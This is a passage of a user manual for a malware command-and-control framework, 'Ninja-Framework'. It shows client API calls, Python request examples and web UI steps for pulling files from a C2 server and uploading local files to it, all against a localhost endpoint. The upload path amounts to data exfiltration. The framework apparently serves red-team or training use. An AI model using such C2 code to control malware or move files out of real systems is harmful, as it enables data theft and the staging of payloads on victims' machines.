# Ninja-Framework User Manual

This user manual will show the how to use the c2Client API, normal HTTP/HTTPS request and web UI to control the malicious action of the malware and C2 functions.

```
# Created:     2024/05/23
# version:     v0.2.3
# Copyright:   Copyright (c) 2024 LiuYuancheng
# License:     MIT License
```

**Table of Contents**

[TOC]

------

### C2 Function API



#### Function [01] Download file from C2 to local 

**Use C2 client API** : 

```
c2Client.downloadfile(fileName, fileDir=dirpath)
```

- fileName: C2 storage file name.
- fileDir: local file storage directory path.

**Use normal http/https request**

- API URL `http(s)://<ip>:<port>/filedownload`
- Request type: `GET`
- Example: 

```
res = requests.get("http://127.0.0.1:5000/filedownload", json={"filename": 'readme.pdf'}, allow_redirects=True, verify=False) # set allow redirect to by pass load balancer
filePath = os.path.join(dirpath, 'readme.pdf')
if res.ok:
    with open(filePath, 'wb') as fh:
    	fh.write(res.content)
```

**Use Web UI**

- Main page => Malware management page [`http://127.0.0.1:5000/malwaremgmt`] => RTC2 File Storage Management => Download a file from C2 to local. ( as shown below )
- Select the download file from the drop down menu then press the `Download` button. 

![](doc/img/um/um_00.png)



#### Function [02] Upload a local file to C2 server 

**Use C2 client API** : 

```
c2Client.uploadfile(filePath)
```

- filePath: local file path. 

**Use normal http/https request**

- API URL `http(s)://<ip>:<port>/fileupload`
- Request type: `POST`
- Example: 

```
rst = requests.post(http://127.0.0.1:5000/fileupload, files={'file': (fileName, fh.read())}, verify=False)
```

**Use Web UI**

- Main page => Malware management page [`http://127.0.0.1:5000/malwaremgmt`] => RTC2 File Storage Management => Upload a local file to C2 server. ( as shown below )
- Select the `choose file` to select the local file then press the `upload` button. 

![](doc/img/um/um_01.png)